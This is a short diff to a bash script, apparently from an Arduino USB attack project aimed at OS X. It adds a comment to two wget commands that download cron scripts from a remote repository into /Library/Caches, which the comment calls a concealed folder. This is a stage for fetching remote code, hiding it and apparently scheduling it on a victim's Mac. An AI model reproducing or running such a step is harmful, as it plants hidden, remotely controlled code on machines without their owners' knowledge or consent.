@@ -1,4 +1,6 @@
 #!/bin/bash
+
+# Download the main files from the repository and saves them to the /Library/Caches folder (write accessible, concealed folder)
 wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-01.sh
 wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-60.sh
 
